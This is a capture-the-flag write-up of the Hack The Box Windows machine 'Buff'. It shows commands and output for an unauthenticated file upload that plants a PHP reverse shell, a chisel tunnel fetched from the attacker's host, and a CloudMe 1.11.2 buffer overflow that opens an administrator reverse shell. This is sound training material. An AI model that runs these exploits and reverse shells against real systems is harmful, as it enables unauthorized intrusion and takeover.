# Target
| Category          | Details                                                       |
|-------------------|---------------------------------------------------------------|
| 📝 **Name**       | [Buff](https://app.hackthebox.com/machines/Buff)              |  
| 🏷 **Type**       | HTB Machine                                                   |
| 🖥 **OS**         | Windows                                                       |
| 🎯 **Difficulty** | Easy                                                          |
| 📁 **Tags**       | Gym Management System 1.0 RCE, CloudMe 1.11.2 Buffer Overflow |

# Scan
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

# Attack path
1. [Gain initial foothold by exploiting RCE in Gym Management System 1.0](#gain-initial-foothold-by-exploiting-rce-in-gym-management-system-10)
2. [Escalate to `Administrator` user by exploiting buffer overflow in CloudMe 1.11.2](#escalate-to-administrator-user-by-exploiting-buffer-overflow-in-cloudme-1112)

### Gain initial foothold by exploiting RCE in Gym Management System 1.0

#### Identify Gym Management Software 1.0 running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ curl -s http://$TARGET:8080/contact.php | grep Made
Made using Gym Management Software 1.0
```

#### Generate `php/reverse_php` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ msfvenom -p php/reverse_php LHOST=$LHOST LPORT=4444 -o reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2642 bytes
Saved as: reverse_shell.php
```

#### Upload generated reverse shell using unauthenticated `/upload` HTTP endpoint
Exploit found in [Exploit Database](https://www.exploit-db.com/exploits/48506)
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ ( printf '\x89\x50\x4e\x47\x0d\x0a\x1a\n'; cat reverse_shell.php ) > reverse_shell.php.png && \
curl http://$TARGET:8080/upload.php?id=reverse_shell -F file=@reverse_shell.php.png -F pupload=upload
```

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Execute uploaded code to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ curl http://$TARGET:8080/upload/reverse_shell.php
```

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.54] from (UNKNOWN) [10.129.25.107] 49675
whoami
buff\shaun
```

### Escalate to `Administrator` user by exploiting buffer overflow in CloudMe 1.11.2

#### Identify CloudMe 1.11.2 running on target system
```
powershell ps 

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
<SNIP>
    322      22    29784      36728              8280   0 CloudMe
<SNIP>

powershell netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
<SNIP>
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       8280
 <SNIP>

dir C:\Users\shaun\Downloads
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,627,005,952 bytes free
```

#### Host `chsiel.exe` from attacker machine
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ python3 -m http.server 80 --directory ~/Tools        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Download `chisel.exe` to target machine
```
powershell wget 10.10.16.54/chisel/chisel.exe -OutFile chisel.exe
```

#### Start `chisel` server in reverse mode on attacker machine
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ chisel server -p 9090 --reverse     
2025/11/04 14:21:23 server: Reverse tunnelling enabled
2025/11/04 14:21:23 server: Fingerprint /hDaVvRIY0iixWIE6YP6k7PmBS1SlsUHEEakXZmOtuI=
2025/11/04 14:21:23 server: Listening on http://0.0.0.0:9090
```

#### Use `chisel.exe` to forward target 8888 to attacker 8888 
```
.\chisel.exe client 10.10.16.54:9090 R:8888:127.0.0.1:8888
```

#### Start `netcat` to listen for 2nd reverse shell connection 
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
```

#### Run CloudMe 1.11.2 buffer overflow exploit
[Exploit](CloudMe_1.11.2.py) is based on [https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389) with modified payload:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.54 LPORT=5555 EXITFUNC=thread -b "\x00\x0d\x0a" -f python`
```
┌──(magicrc㉿perun)-[~/attack/HTB Buff]
└─$ python3 ./CloudMe_1.11.2.py
```

#### Confirm escalation
```
connect to [10.10.16.54] from (UNKNOWN) [10.129.25.107] 49688
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami
buff\administrator
```
